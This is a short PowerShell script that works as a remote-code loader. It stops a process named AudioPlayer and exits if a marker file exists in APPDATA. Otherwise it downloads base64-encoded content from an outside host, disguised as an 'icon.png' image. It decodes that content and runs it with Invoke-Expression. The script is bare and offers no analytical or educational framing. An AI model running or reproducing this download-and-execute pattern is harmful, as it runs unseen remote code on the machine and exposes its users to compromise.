Stop-Process -Name AudioPlayer -ErrorAction SilentlyContinue;

$stopPath="$env:APPDATA\signedin";
if(Test-Path "$stopPath") {
    echo terminating
    exit
};

echo "downloading remote";
$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest "https://trnila.eu/pvbs/icon.png" -UseBasicParsing).Content));
Invoke-Expression "$s";
echo "OK";